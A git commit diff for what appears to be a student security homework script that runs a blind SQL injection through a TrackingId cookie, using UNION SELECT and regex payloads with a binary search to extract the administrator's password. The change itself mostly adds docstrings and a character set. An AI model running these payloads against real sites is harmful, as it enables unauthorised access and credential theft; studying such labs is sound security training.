ff5ac51a6949278b1115798446d4a333c869a1e0
Evan <elafleur@pdx.edu>
2022-02-07 11:59:17 -0800

    added string library for binary search to function, added docstrings

--- hw2/hw2.py
+++ hw2/hw2.py
@@ -1,4 +1,4 @@
-import requests, sys, time, urllib.parse
+import requests, sys, time, urllib.parse, string
 from bs4 import BeautifulSoup
 
 #Strips the URL down which is passed in at run time
@@ -23,6 +23,16 @@ query_pass = f"x' UNION SELECT username FROM users WHERE username='administrator
 #the functions it called from
 #takes a query as the arg
 def try_query(query):
+    """
+    Runs query on site for accuracy.
+    Performs/Parses the data returned to determine if the request is valid
+
+    args:
+        query: the test query to be run
+    
+    returns:
+        true/false: depending on if the test was successful
+    """
     #print(f'Query: {query}')
     mycookies = {'TrackingId': urllib.parse.quote_plus(query) }
     resp = requests.get(url, cookies=mycookies)
@@ -36,6 +46,9 @@ def DetermineLength():
     '''
     Determines the length of the password
     by locating the admin password length in SQL
+
+    Args:
+        none
     '''
     #Tests the query fucntion
     try_query("""x' OR 1=1 --""")
@@ -64,6 +77,10 @@ def LinearSearch(arr, password_length):
         Iterates through the rest of the password
         -Takes the number of characters from above 
         and uses that as a bound.
+
+    Args:
+        arr:the test set of characters used to find password
+        password_length: the total length of the suspect
     '''
     for i in range(len(characters)):
         query1 = f"{query_pass} ~ '^{characters[i]}'--"
@@ -87,6 +104,15 @@ def LinearSearch(arr, password_length):
     return(try_password[0])
 
 def GetMatch(try_password):
+    """
+    Performs a test query to see if the password matches
+
+    Args:
+        try_pass: is the password variable used to store
+                    already found portion of the password
+    Returns: 
+        True/False depending on if the query is correct    
+    """ 
     query = f"{query_pass} ~ '^{try_password}$'--"
     if try_query(query) == True:
         print(f"Found pass: {try_password}")
@@ -94,9 +120,25 @@ def GetMatch(try_password):
     return False
 
 def BinarySearchRec(try_pass, arr, high_point, low_point):
+    """
+    Takes the total problem of finding the password,
+    divides it in half and proceeds to run subqueries 
+    until the complete password is found
+
+    This is is recursive portion for the BinarySearch function
+    Args:
+        try_pass: is the password variable used to store
+                    already found portion of the password
+        arr: the test set of characters used to find password
+        high_point: the upper bound for the binary search
+        low_point: the lower bound of the binary search
+              
+    """  
     if high_point >= low_point:
+        #Finds the middle point for splitting up the password search
         middle_point = (high_point + low_point) // 2
 
+        #IF query is true, pass and middle are valid
         if try_pass is not None:
             query = f"{query_pass} ~ '^{try_pass+arr[middle_point]}'--"
         else:
@@ -105,11 +147,14 @@ def BinarySearchRec(try_pass, arr, high_point, low_point):
         if try_query(query) == True:
             return arr[middle_point]
         
+        
         if try_pass is not None:
             query = f"{query_pass} ~ '^{try_pass}[{arr[:middle_point]}]'--"
         else:
             query = f"{query_pass} ~ '^[{arr[:middle_point]}]'--"
-
+        
+        #checks all the characters in password up to the middle point
+        #then moves to lower point
         if try_query(query) == True:
             return BinarySearchRec(try_pass, arr, middle_point-1, low_point)
         else:
@@ -117,6 +162,15 @@ def BinarySearchRec(try_pass, arr, high_point, low_point):
 
 
 def BinarySearch(arr):
+    """
+    Takes the total problem of finding the password,
+    divides it in half and proceeds to run subqueries 
+    until the complete password is found
+    Args:
+        arr: takes in an array of potential characters 
+        that the program will use to find the password
+              
+    """      
     max_attempts = 50
 
     try_pass = BinarySearchRec(None, arr, len(arr)-1, 0)
@@ -142,4 +196,7 @@ if __name__ == '__main__':
     # LinearSearch(characters, length)
     # print(f'Password: {try_password}')
 
-    BinarySearch(characters)
+    character_set = string.ascii_lowercase + string.digits
+
+    BinarySearch(character_set)
+
